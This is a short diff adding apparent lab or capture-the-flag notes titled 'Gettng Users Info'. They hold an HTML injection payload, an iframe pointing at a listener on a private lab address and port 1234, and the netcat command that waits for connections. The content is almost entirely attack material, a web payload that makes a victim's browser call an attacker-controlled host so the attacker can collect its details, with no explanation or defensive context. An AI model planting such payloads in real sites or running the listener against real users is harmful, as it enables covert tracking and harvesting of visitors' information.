@@ -1,0 +1,15 @@
+Gettng Users Info
+
+//Payload
+<iframe src="http://192.168.56.1:1234"></iframe>
+
+CONNECTION               http://192.168.56.1:1234
+
+1234                                  PORT
+
+//Payload
+
+
+//listening
+
+nc -nvlp 1234
